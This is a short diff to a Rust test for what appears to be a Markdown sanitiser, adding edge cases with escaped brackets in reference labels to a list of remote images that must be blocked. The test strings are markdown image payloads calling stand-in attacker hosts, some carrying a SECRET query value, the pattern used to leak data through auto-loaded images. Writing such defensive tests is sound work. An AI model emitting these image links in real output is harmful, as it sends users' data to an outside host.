@@ -42,6 +42,10 @@ fn remote_and_defined_remote_images_still_block() {
         // CommonMark ends a line at a bare CR, and only spaces and tabs make
         // a line blank, so these images are paragraphs, not indented code.
         "intro\n\n    x\r![a](https://attacker.example/c?d=SECRET)\n",
+        // Escaped brackets inside reference labels.
+        "![s][a\\]b]\n\n[a\\]b]: https://attacker.example/c?d=SECRET",
+        "![a\\[b]\n\n[a\\[b]: //attacker.example/x",
+        "![a\\]b] next to https://attacker.example/x",
         "intro\n\u{a0}\n    ![a](//attacker.example/x)\n",
         "```\r\nx\r\n```\r\n![a](https://evil.example/x)",
     ] {
